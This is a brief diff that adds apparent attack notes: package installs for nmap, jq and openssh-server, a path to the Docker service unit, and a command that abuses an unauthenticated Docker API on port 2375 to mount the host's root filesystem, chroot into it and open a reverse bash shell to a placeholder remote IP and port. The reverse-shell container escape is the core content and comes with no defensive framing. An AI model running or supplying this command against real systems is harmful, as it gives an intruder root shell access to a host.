@@ -1,0 +1,6 @@
+sudo apt install nmap
+sudo apt install jq
+sudo apt install openssh-server
+/lib/systemd/system/docker.service
+
+docker -H tcp://localhost:2375 run --rm -v /:/mnt ubuntu chroot /mnt /bin/bash -c "bash -i >& /dev/tcp/<REMOTEMACHINE IP>/<PORT> 0>&1"
